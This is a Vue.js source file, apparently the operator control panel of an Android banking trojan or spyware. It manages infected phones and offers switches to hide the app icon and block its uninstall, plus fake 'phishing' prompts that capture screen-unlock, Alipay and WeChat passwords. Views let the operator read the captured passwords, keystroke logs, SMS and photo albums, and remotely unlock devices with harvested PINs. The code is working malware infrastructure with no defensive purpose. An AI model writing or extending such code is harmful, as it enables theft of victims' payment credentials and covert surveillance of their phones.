<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()" class="query-form" label-width="90px">
      <el-row :gutter="20">
        <el-col :span="6">
          <el-form-item label="设备ID">
            <el-input v-model="dataForm.deviceId" placeholder="请输入设备ID" clearable></el-input>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="所属包">
            <el-input v-model="dataForm.pkg" placeholder="请输入所属包" clearable></el-input>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="手机型号">
            <el-input v-model="dataForm.model" placeholder="请输入手机型号" clearable></el-input>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="品牌">
            <el-input v-model="dataForm.brand" placeholder="请输入品牌" clearable></el-input>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="安装应用">
            <el-select v-model="dataForm.installApp" placeholder="请选择安装应用" clearable>
              <el-option v-for="item in installAppFilter" :key="item.pkg" :label="item.pkg" :value="item.pkg"></el-option>
            </el-select>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="屏幕状态">
            <el-select v-model="dataForm.status" placeholder="请选择状态" clearable>
              <el-option label="熄屏" :value="0"></el-option>
              <el-option label="亮屏" :value="1"></el-option>
            </el-select>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="已杀/未杀">
            <el-select v-model="dataForm.kill" placeholder="请选择状态" clearable>
              <el-option label="未杀" :value="0"></el-option>
              <el-option label="已杀" :value="1"></el-option>
            </el-select>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="无障碍">
            <el-select v-model="dataForm.accessibilityServiceEnabled" placeholder="请选择无障碍状态" clearable>
              <el-option label="开启无障碍" :value="1"></el-option>
            </el-select>
          </el-form-item>
        </el-col>
        <el-col :span="6">
          <el-form-item label="安装时间">
            <el-date-picker
              v-model="createdRange"
              type="datetimerange"
              range-separator="至"
              start-placeholder="开始时间"
              end-placeholder="结束时间"
              format="YYYY-MM-DD HH:mm:ss"
              value-format="x"
              @change="onCreatedTimeChange"
              style="width: 100%"
            />
          </el-form-item>
        </el-col>

        <el-col :span="6">
          <el-form-item label="备注">
            <el-input v-model="dataForm.remark" placeholder="请输入备注" clearable></el-input>
          </el-form-item>
        </el-col>

        <el-col :span="12" class="query-buttons">
          <el-button type="primary" @click="getDataList()">查询</el-button>
          <el-button @click="resetQuery()">重置</el-button>
        </el-col>
      </el-row>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" table-layout="auto" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip>
        <template v-slot="scope">
          <el-button link type="primary" @click="openDeviceDetail(scope.row)">{{ scope.row.deviceId }}</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="120px" show-overflow-tooltip></el-table-column>
      <el-table-column label="品牌/型号" header-align="center" align="center" width="100px" show-overflow-tooltip>
        <template v-slot="scope">
          <div class="cell-two-line">
            <div v-if="scope.row.brand">{{ scope.row.brand }}</div>
            <div v-if="scope.row.model">{{ scope.row.model }}</div>
            <div v-if="!scope.row.brand && !scope.row.model">-</div>
          </div>
        </template>
      </el-table-column>
      <el-table-column prop="ip" label="城市/IP" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
        <template v-slot="scope">
          <div class="cell-two-line">
            <div v-if="scope.row.addr">{{ scope.row.addr }}</div>
            <div v-if="scope.row.ip">{{ scope.row.ip }}</div>
            <div v-if="!scope.row.addr && !scope.row.ip">-</div>
          </div>
        </template>
      </el-table-column>
      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="created" label="安装时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>

      <el-table-column label="控制开关" header-align="center" align="right" width="260px">
        <template v-slot="scope">
          <div class="switch-grid">
            <div class="switch-item">
              <span class="switch-label">隐藏图标</span>
              <el-switch :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
            </div>
            <div class="switch-item">
              <span class="switch-label">阻止卸载</span>
              <el-switch :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
            </div>
            <div class="switch-item">
              <span class="switch-label">解锁密码</span>
              <el-switch :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
            </div>
            <div class="switch-item">
              <span class="switch-label">是否被杀</span>
              <el-switch :model-value="scope.row.kill == 1" @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
            </div>

            <div class="switch-item" v-for="item in fishTemplateList.filter((x) => x.code === 'zfb' || x.code === 'wx')" :key="item.code">
              <span class="switch-label">{{ item.code === "zfb" ? "ZFB密码" : "WX密码" }}</span>
              <div class="switch-actions">
                <el-switch :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]" @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
                <el-button v-if="!scope.row.fishSwitch || !scope.row.fishSwitch[item.code]" link type="primary" size="small" @click="showFishPwd(scope.row, item.code)">查看</el-button>
              </div>
            </div>
          </div>
          <div class="switch-item">
              <span class="switch-label">上传日志</span>
               <el-switch :model-value="scope.row.uplog == 1" @update:model-value="updateDeviceSwitch(scope.row, 'uplog', $event)" />
            </div>
        </template>
      </el-table-column>

      <el-table-column label="权限开关" header-align="center" align="center" width="150px">
        <template v-slot="scope">
          <div class="perm-grid">
            <el-tag class="perm-tag" size="small" effect="light" :type="scope.row.accessibilityServiceEnabled == 1 ? 'success' : 'danger'">
              <span class="perm-text">无障碍</span>
              <el-icon class="perm-icon">
                <Select v-if="scope.row.accessibilityServiceEnabled == 1" />
                <Close v-else />
              </el-icon>
            </el-tag>

            <el-tooltip v-for="(value, key) in scope.row.permissions" :key="key" :content="String(key)" placement="top" :show-after="300">
              <el-tag class="perm-tag" size="small" effect="light" :type="value ? 'success' : 'danger'">
                <span class="perm-text">{{ permissionsName[key] || key }}</span>
                <el-icon class="perm-icon">
                  <Select v-if="value" />
                  <Close v-else />
                </el-icon>
              </el-tag>
            </el-tooltip>
          </div>
        </template>
      </el-table-column>
      <el-table-column label="屏幕状态" header-align="center" align="center" width="120px">
        <template v-slot="scope">
          <div class="screen-status-grid">
            <el-tag v-if="scope.row.status == 0" size="small" effect="light" type="info">熄屏</el-tag>
            <el-tag v-else-if="scope.row.status == 1" size="small" effect="light" type="success">亮屏</el-tag>
            <el-tag v-else-if="scope.row.status == 2 || scope.row.status == 3" size="small" effect="light" type="warning">等待唤醒</el-tag>
            <el-tag v-else size="small" effect="light" type="info">未知</el-tag>

            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row.lockScreen)" placement="top" :show-after="300">
              <el-tag size="small" effect="light" type="success">可解锁</el-tag>
            </el-tooltip>
            <el-tag v-else size="small" effect="light" type="danger">不可解锁</el-tag>
          </div>
        </template>
      </el-table-column>
      <el-table-column label="系统/SDK" header-align="center" align="center" width="100px" show-overflow-tooltip>
        <template v-slot="scope">
          {{
            scope.row.systemVersion && scope.row.sdkVersion !== null && scope.row.sdkVersion !== undefined && scope.row.sdkVersion !== ""
              ? `${scope.row.systemVersion} / ${scope.row.sdkVersion}`
              : scope.row.systemVersion || (scope.row.sdkVersion !== null && scope.row.sdkVersion !== undefined ? String(scope.row.sdkVersion) : "") || ""
          }}
        </template>
      </el-table-column>
      <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
        <template v-slot="scope">
          <!-- <el-button-group > -->
          <div>
            <el-button link type="primary" @click="openDeviceDetail(scope.row)">链接设备</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showInputLog(scope.row)">输入记录</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showAppList(scope.row)">安装应用</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showSmsList(scope.row)">短信记录</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showAlbumList(scope.row)">查看相册</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showRemarkDialog(scope.row)">备注</el-button>
          </div>
          <!-- </el-button-group> -->
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>
    <!-- 详情页已改为新Tab打开，不再使用弹窗 -->
    <!-- 输入日志弹窗 -->
    <el-dialog
      v-model="inputLogVisible"
      :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
      width="970px"
      :close-on-click-modal="false"
      class="input-log-dialog"
      destroy-on-close
    >
      <div class="log-header">
        <div class="header-row">
          <div class="query-controls">
            <span class="query-label">来源:</span>
            <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
              <el-option label="管理端" :value="1" />
              <el-option label="App端" :value="0" />
            </el-select>
            <span class="query-label">APP包名:</span>
            <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
            <span class="query-label">查询日期:</span>
            <el-date-picker
              v-model="queryDate"
              type="daterange"
              range-separator="至"
              start-placeholder="开始日期"
              end-placeholder="结束日期"
              format="YYYY-MM-DD"
              value-format="YYYY-MM-DD"
              @change="onDateChange"
              style="width: 280px"
            />
            <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
          </div>
        </div>
      </div>

      <div class="log-content" v-loading="logLoading">
        <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
          <div class="log-content-row">
            <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
            <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">
              {{ item.source == 1 ? "管理端" : "App端" }}
            </span>
            <span class="log-app">{{ item.app }}</span>
            <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
            <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
          </div>
        </div>
        <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
      </div>

      <template #footer>
        <el-button @click="inputLogVisible = false">关闭</el-button>
      </template>
    </el-dialog>

    <!-- 安装应用弹窗 -->
    <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <AppList :device-id="currentAppDevice.deviceId" />
    </el-dialog>
    <!-- 选择解锁密码弹窗 -->
    <el-dialog v-model="unlockDialogVisible" :title="`选择解锁密码 - 设备ID: ${currentWakeRow?.deviceId || ''}`" width="480px" :close-on-click-modal="false" destroy-on-close>
      <div>
        <el-form label-width="90px">
          <el-form-item label="解锁密码">
            <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
              <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id">
                <span style="float: left">{{ formatUnlockTips(item) }}</span>
                <span style="float: right; color: #8492a6; font-size: 13px">
                  <span style="color: #00adff">{{ item.createDate }}</span>
                </span>
              </el-option>
            </el-select>
          </el-form-item>
        </el-form>
      </div>
      <template #footer>
        <el-button @click="unlockDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="confirmWakeup" :loading="unlocking" :disabled="!selectedUnlockId">确定</el-button>
      </template>
    </el-dialog>

    <!-- 短信记录弹窗 -->
    <el-dialog v-model="smsListVisible" :title="`短信记录 - 设备ID: ${currentSmsDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <SmsList :device-id="currentSmsDevice.deviceId" />
    </el-dialog>
    <!-- 相册列表弹窗 -->
    <el-dialog v-model="albumListVisible" :title="`相册列表 - 设备ID: ${currentAlbumDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <AlbumList :device-id="currentAlbumDevice.deviceId" />
    </el-dialog>
    <!-- 备注弹窗 -->
    <el-dialog v-model="remarkDialogVisible" :title="`设备备注 - 设备ID: ${currentRemarkDevice.deviceId}`" width="500px" :close-on-click-modal="false" destroy-on-close>
      <el-form label-width="80px">
        <el-form-item label="备注内容">
          <el-input v-model="remarkContent" type="textarea" :rows="4" placeholder="请输入备注内容" clearable />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="remarkDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="submitRemark" :loading="remarkSubmitting">确定</el-button>
      </template>
    </el-dialog>

    <!-- 查看钓鱼密码弹窗 -->
    <el-dialog v-model="fishPwdDialogVisible" :title="`钓鱼密码 - ${fishPwdTitle}`" width="700px" :close-on-click-modal="false" destroy-on-close>
      <div v-loading="fishPwdLoading">
        <el-table :data="fishPwdList" border style="width: 100%">
          <el-table-column prop="data" label="密码" header-align="center" align="center" show-overflow-tooltip></el-table-column>
          <el-table-column prop="created" label="采集时间" header-align="center" align="center" width="180px"></el-table-column>
        </el-table>
        <div v-if="fishPwdList.length === 0 && !fishPwdLoading" style="text-align: center; padding: 20px; color: #909399">暂无数据</div>
      </div>
      <template #footer>
        <el-button @click="fishPwdDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import AppList from "@/views/apps/list.vue";
import SmsList from "@/views/sms/list.vue";
import AlbumList from "@/views/album/list.vue";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {
    AppList,
    SmsList,
    AlbumList
  },
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/device/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        pkg: "",
        phone: "",
        model: "",
        language: "",
        brand: "",
        installApp: "",
        status: "",
        remark: "",
        kill: "",
        accessibilityServiceEnabled: "",
        // 安装时间范围（如后端需要可使用这两个字段）
        createdStart: "",
        createdEnd: ""
      }
    });
    const deviceId = ref("");
    const fishTemplateList = ref<any[]>([]);
    const inputLogVisible = ref(false);
    const logLoading = ref(false);
    const inputLogList = ref([]);
    const queryDate = ref<any>([]);
    const queryAppPkg = ref("");
    const querySource = ref(null);
    const currentDevice = ref({
      deviceId: "",
      pkg: ""
    });
    const appListVisible = ref(false);
    const currentAppDevice = ref({
      deviceId: ""
    });
    const unlockDialogVisible = ref(false);
    const unlockOptions = ref<any[]>([]);
    const selectedUnlockId = ref<any>(null);
    const unlocking = ref(false);
    const currentWakeRow = ref<any | null>(null);
    const smsListVisible = ref(false);
    const currentSmsDevice = ref({
      deviceId: ""
    });
    const albumListVisible = ref(false);
    const currentAlbumDevice = ref({
      deviceId: ""
    });
    const createdRange = ref<any>(null);
    const remarkDialogVisible = ref(false);
    const remarkContent = ref("");
    const remarkSubmitting = ref(false);
    const currentRemarkDevice = ref({
      id: "",
      deviceId: "",
      remark: ""
    });
    const fishPwdDialogVisible = ref(false);
    const fishPwdLoading = ref(false);
    const fishPwdList = ref<any[]>([]);
    const fishPwdTitle = ref("");

    return {
      ...useView(state),
      ...toRefs(state),
      deviceId,
      inputLogVisible,
      logLoading,
      inputLogList,
      queryDate,
      queryAppPkg,
      querySource,
      currentDevice,
      appListVisible,
      currentAppDevice,
      unlockDialogVisible,
      unlockOptions,
      selectedUnlockId,
      unlocking,
      currentWakeRow,
      smsListVisible,
      currentSmsDevice,
      albumListVisible,
      currentAlbumDevice,
      createdRange,
      remarkDialogVisible,
      remarkContent,
      remarkSubmitting,
      currentRemarkDevice,
      fishPwdDialogVisible,
      fishPwdLoading,
      fishPwdList,
      fishPwdTitle,
      fishTemplateList,
      permissionsName: {
        "android.permission.READ_SMS": "短信",
        "android.permission.READ_MEDIA_IMAGES": "相册",
        "android.permission.BATTERY": "电池",
        "android.permission.AUTO_START": "自启动"
      }
    };
  },
  async mounted() {
    await this.fetchInstallAppFilterList();
    // 自动执行一次查询
    this.getDataList();
    await this.fetchFishTemplateList();
  },
  methods: {
    resetQuery() {
      // 清空查询条件（保持 dataForm 引用不变，避免丢失响应性）
      Object.assign(this.dataForm, {
        deviceId: "",
        pkg: "",
        phone: "",
        model: "",
        language: "",
        brand: "",
        installApp: "",
        status: "",
        remark: "",
        kill: "",
        accessibilityServiceEnabled: "",
        createdStart: "",
        createdEnd: ""
      });

      // 清空日期选择器
      this.createdRange = null;

      // 重新查询
      this.getDataList();
    },
    onCreatedTimeChange(value: any) {
      // value-format="x" -> 毫秒时间戳
      if (value && Array.isArray(value) && value.length === 2) {
        this.dataForm.createdStart = value[0];
        this.dataForm.createdEnd = value[1];
      } else {
        this.dataForm.createdStart = "";
        this.dataForm.createdEnd = "";
      }
    },
    async fetchFishTemplateList() {
      let { code, data, msg } = await baseService.post("/device/fishCodeList");
      if (code == 0) {
        this.fishTemplateList = data;
      } else {
        ElMessage.error(msg || "获取钓鱼模板失败");
      }
    },
    openDeviceDetail(row: any) {
      // 用 sessionStorage 传递设备信息，避免 URL 过长
      const key = `device_detail_${row.deviceId}_${Date.now()}`;
      sessionStorage.setItem(key, JSON.stringify(row));

      const base = window.location.href.split("#")[0];
      const qs = new URLSearchParams({
        pop: "true",
        page: "1",
        key,
        _mt: `设备详情-${row.deviceId}`
      }).toString();
      window.open(`${base}#/device/detail?${qs}`, "_blank");
    },
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    async wakeup(row: any) {
      //获取解锁密码
      const { success, data, msg } = await baseService.post("/unlockScreenPwd/page", {
        deviceId: row.id,
        page: 1,
        limit: 100
      });
      if (!success) {
        ElMessage.error(msg);
        return;
      }
      // 展示 弹出选择密码的弹窗（下拉显示 tips）
      const list = Array.isArray(data) ? data : (data && (data.list || data.records)) || [];
      this.unlockOptions = list || [];
      if (!this.unlockOptions || this.unlockOptions.length === 0) {
        ElMessage({ message: "暂无可选解锁密码，请先添加", type: "warning" });
        return;
      }
      this.currentWakeRow = row;
      this.selectedUnlockId = this.unlockOptions[0]?.id || null;
      this.unlockDialogVisible = true;
    },

    async confirmWakeup() {
      if (!this.currentWakeRow || !this.selectedUnlockId) {
        ElMessage({ message: "请选择解锁密码", type: "warning" });
        return;
      }
      this.unlocking = true;
      try {
        const { code, msg } = await baseService.post("/device/wakeup", {
          id: this.currentWakeRow.id,
          unlockPwdId: this.selectedUnlockId
        });
        if (code == 0) {
          ElMessage({ message: "操作成功,等待唤醒!", type: "success" });
          this.unlockDialogVisible = false;
          this.currentWakeRow = null;
          this.selectedUnlockId = null;
          this.getDataList();
        } else {
          ElMessageBox.alert(msg, "错误", { type: "error", confirmButtonText: "OK" });
        }
      } finally {
        this.unlocking = false;
      }
    },

    async showInputLog(row: any) {
      this.currentDevice.deviceId = row.deviceId;
      this.currentDevice.pkg = row.pkg; // 包名
      this.queryAppPkg = ""; // 清空APP包名输入框
      this.querySource = null; // 清空来源选择

      // 设置默认查询日期为今天（范围）
      const today = new Date();
      const todayStr = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, "0") + "-" + String(today.getDate()).padStart(2, "0");
      this.queryDate = [todayStr, todayStr];

      this.inputLogVisible = true;
      this.inputLogList = [];

      // 执行查询
      await this.refreshLog();
    },
    async refreshLog() {
      if (!this.currentDevice.deviceId || !this.currentDevice.pkg || !this.queryDate || !Array.isArray(this.queryDate) || this.queryDate.length !== 2) {
        ElMessage({
          message: "查询参数不完整",
          type: "warning"
        });
        return;
      }

      this.logLoading = true;
      this.inputLogList = [];

      try {
        // 根据选择的日期范围计算起止时间
        const [startStr, endStr] = this.queryDate as [string, string];
        const startDate = new Date(startStr);
        const endDate = new Date(endStr);
        const startTime = new Date(startDate.getFullYear(), startDate.getMonth(), startDate.getDate()).getTime();
        const endTime = new Date(endDate.getFullYear(), endDate.getMonth(), endDate.getDate() + 1).getTime() - 1;

        const { code, data, msg } = await baseService.post("/inputTextRecord/group", {
          deviceId: this.currentDevice.deviceId,
          startTime: startTime,
          endTime: endTime,
          pkg: this.currentDevice.pkg,
          appPkg: this.queryAppPkg || undefined, // 如果有输入APP包名则传递，否则不传
          source: this.querySource !== null ? this.querySource : undefined // 如果选择了来源则传递
        });

        if (code == 0) {
          // 处理返回的数据结构：data是单个InputTextGroup对象
          if (data && data.items && Array.isArray(data.items)) {
            this.inputLogList = data.items;
          } else {
            this.inputLogList = [];
          }
        } else {
          ElMessage({
            message: msg || "获取日志失败",
            type: "error"
          });
        }
      } catch (error) {
        ElMessage({
          message: "获取日志失败",
          type: "error"
        });
      } finally {
        this.logLoading = false;
      }
    },
    onDateChange() {
      // 日期改变时可以自动查询，或者用户手动点击按钮查询
      // this.refreshLog();
    },
    formatTime(timestamp: any) {
      if (!timestamp) return "";

      const timeNum = Number(timestamp);
      if (isNaN(timeNum)) return "";

      const date = new Date(timeNum);
      if (isNaN(date.getTime())) return "";

      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, "0");
      const day = String(date.getDate()).padStart(2, "0");
      const hours = String(date.getHours()).padStart(2, "0");
      const minutes = String(date.getMinutes()).padStart(2, "0");
      const seconds = String(date.getSeconds()).padStart(2, "0");

      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    },
    async updateFishSwitch(row: any, field: string, value: boolean) {
      try {
        const { success, msg } = await baseService.post(
          "/device/updateFishSwitch",
          {
            id: row.id,
            code: field,
            value: value
          },
          undefined,
          true
        );
        if (success) {
          ElMessage.success("更新成功");
          this.getDataList();
        } else {
          ElMessage.error(msg || "更新失败");
        }
      } catch (error) {
        ElMessage.error("更新失败");
      }
    },
    async updateDeviceSwitch(row: any, field: string, value: boolean) {
      // 将 boolean 转换为 int (true -> 1, false -> 0)
      const intValue = value ? 1 : 0;

      // 更新本地数据
      row[field] = intValue;

      // 这里可以添加 API 调用来同步到后端
      // 例如:
      try {
        const { success, msg } = await baseService.post(
          "/device/updateSwitch",
          {
            id: row.id,
            [field]: intValue
          },
          undefined,
          true
        );
        if (success) {
          ElMessage.success("更新成功");
        } else {
          ElMessage.error(msg || "更新失败");
          // 恢复原值
          row[field] = intValue ? 0 : 1;
        }
      } catch (error) {
        ElMessage.error("更新失败");
        // 恢复原值
        row[field] = intValue ? 0 : 1;
      }
    },
    formatUnlockTips(lockScreen: any) {
      let type = "";
      switch (lockScreen.type) {
        case 0:
          return "无锁";
        case 1:
          type = "PIN码";
          break;
        case 2:
          type = "手势";
          break;
        case 3:
          type = "混合密码";
          break;
        default:
          return "未知";
      }

      let source = "";

      switch (lockScreen.source) {
        case 1:
          source = "钓鱼";
          break;
        case 2:
          source = "采集";
          break;
        default:
          source = "未知";
          break;
      }
      return `(${source}) - ${type}:${lockScreen.tips}`;
    },
    showAppList(row: any) {
      this.currentAppDevice.deviceId = row.deviceId;
      this.appListVisible = true;
    },
    showSmsList(row: any) {
      this.currentSmsDevice.deviceId = row.deviceId;
      this.smsListVisible = true;
    },
    showAlbumList(row: any) {
      this.currentAlbumDevice.deviceId = row.deviceId;
      this.albumListVisible = true;
    },
    showRemarkDialog(row: any) {
      this.currentRemarkDevice.id = row.id;
      this.currentRemarkDevice.deviceId = row.deviceId;
      this.currentRemarkDevice.remark = row.remark || "";
      this.remarkContent = row.remark || "";
      this.remarkDialogVisible = true;
    },
    async submitRemark() {
      if (!this.currentRemarkDevice.id) {
        ElMessage.error("设备ID不能为空");
        return;
      }

      this.remarkSubmitting = true;
      try {
        const { code, msg } = await baseService.post("/device/updateRemark", {
          id: this.currentRemarkDevice.id,
          remark: this.remarkContent
        });

        if (code === 0) {
          ElMessage.success("备注更新成功");
          this.remarkDialogVisible = false;
          this.remarkContent = "";
          // 刷新列表
          this.getDataList();
        } else {
          ElMessage.error(msg || "备注更新失败");
        }
      } catch (error) {
        ElMessage.error("备注更新失败");
      } finally {
        this.remarkSubmitting = false;
      }
    },
    async showFishPwd(row: any, code: string) {
      this.fishPwdLoading = true;
      this.fishPwdDialogVisible = true;
      this.fishPwdList = [];

      // 设置标题
      const codeNames: any = {
        wx: "微信",
        zfb: "支付宝"
      };
      this.fishPwdTitle = `设备ID: ${row.deviceId} - ${codeNames[code] || code}`;

      try {
        const {
          code: resCode,
          data,
          msg
        } = await baseService.post("/device/showFishPwd", {
          deviceId: row.deviceId,
          code: code
        });

        if (resCode === 0 && data) {
          // data 是一个数组
          this.fishPwdList = Array.isArray(data) ? data : [];
          if (this.fishPwdList.length === 0) {
            ElMessage.warning("暂无钓鱼密码数据");
          }
        } else {
          ElMessage.error(msg || "获取钓鱼密码失败");
          this.fishPwdDialogVisible = false;
        }
      } catch (error) {
        ElMessage.error("获取钓鱼密码失败");
        this.fishPwdDialogVisible = false;
      } finally {
        this.fishPwdLoading = false;
      }
    }
  }
});
</script>

<style scoped>
.action-buttons {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  gap: 2px;
}

/* 当空间不够时，按钮垂直排列 */
@media (max-width: 1200px) {
  .action-buttons {
    flex-direction: column;
    gap: 2px;
  }
}

.action-buttons.compact .row {
  display: flex;
  gap: 4px;
  justify-content: center;
  align-items: center;
  flex-wrap: nowrap;
}

.action-buttons.compact .el-button + .el-button {
  margin-left: 4px;
}

/* 输入日志弹窗样式 */
.input-log-dialog .el-dialog__body {
  padding: 10px 20px;
}

.log-header {
  margin-bottom: 20px;
  padding: 15px;
  background: #f5f7fa;
  border-radius: 8px;
}

.header-row {
  display: flex;
  justify-content: flex-start;
  align-items: center;
  width: 100%;
}

.query-controls {
  display: flex;
  align-items: center;
  gap: 12px;
}

.query-label {
  font-size: 14px;
  font-weight: 500;
  color: #606266;
  white-space: nowrap;
}

.log-content {
  max-height: 500px;
  overflow-y: auto;
  border: 1px solid #e4e7ed;
  border-radius: 8px;
  padding: 10px;
  background: #fafafa;
}

.log-item {
  margin-bottom: 10px;
  padding: 10px 12px;
  background: white;
  border-radius: 6px;
  border-left: 3px solid #409eff;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.log-item.password-item {
  background: #fef0f0;
  border-left-color: #f56c6c;
  box-shadow: 0 2px 8px rgba(245, 108, 108, 0.2);
}

.log-item.password-item .log-text {
  background: #fde2e2;
  color: #f56c6c;
  font-weight: 500;
}

.log-content-row {
  display: flex;
  align-items: center;
  gap: 12px;
  flex-wrap: wrap;
  font-size: 13px;
}

.log-time {
  font-weight: 500;
}

.log-source {
  padding: 2px 8px;
  border-radius: 12px;
  font-size: 12px;
  font-weight: 500;
  margin-right: 8px;
}

.log-source.source-admin {
  background: #f0f9ff;
  color: #1d4ed8;
  border: 1px solid #dbeafe;
}

.log-source.source-app {
  background: #f0fdf4;
  color: #15803d;
  border: 1px solid #dcfce7;
}

.log-app {
  background: #e1f3d8;
  padding: 2px 8px;
  border-radius: 12px;
  color: #67c23a;
}

.log-resource {
  background: #e6f7ff;
  padding: 2px 8px;
  border-radius: 12px;
  color: #1890ff;
  font-size: 11px;
}

.log-text {
  font-family: "Courier New", monospace;
  font-size: 13px;
  color: #303133;
  background: #f8f9fa;
  padding: 4px 8px;
  border-radius: 4px;
  word-break: break-all;
  flex: 1;
  min-width: 0;
}

.no-data {
  text-align: center;
  padding: 50px;
  color: #909399;
  font-size: 14px;
}

.query-form {
  margin-bottom: 20px;
}
.query-buttons {
  text-align: right;
}

/* 查询条件：统一对齐（label 固定宽度 + item 占满 col 宽度） */
.query-form :deep(.el-form-item) {
  width: 100%;
  margin-right: 0;
}

.query-form :deep(.el-form-item__content) {
  flex: 1;
  min-width: 0;
}

.query-form :deep(.el-input),
.query-form :deep(.el-select),
.query-form :deep(.el-date-editor) {
  width: 100%;
}

/* 开关列：两列网格 + 每项左右对齐，避免换行导致错位 */
.switch-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  column-gap: 12px;
  row-gap: 8px;
  align-items: center;
}

.switch-item {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  min-width: 0;
}

.switch-label {
  font-size: 12px;
  color: #606266;
  white-space: nowrap;
}

.switch-actions {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  flex-shrink: 0;
}

.cell-two-line {
  display: flex;
  flex-direction: column;
  line-height: 16px;
}

/* 权限开关：紧凑可换行展示 */
.perm-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  justify-content: center;
}

.perm-tag {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  max-width: 140px;
}

.perm-text {
  max-width: 90px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.perm-icon {
  flex-shrink: 0;
}

/* 屏幕状态：两枚tag垂直排列，居中对齐 */
.screen-status-grid {
  display: inline-flex;
  flex-direction: column;
  gap: 6px;
  align-items: center;
}
</style>
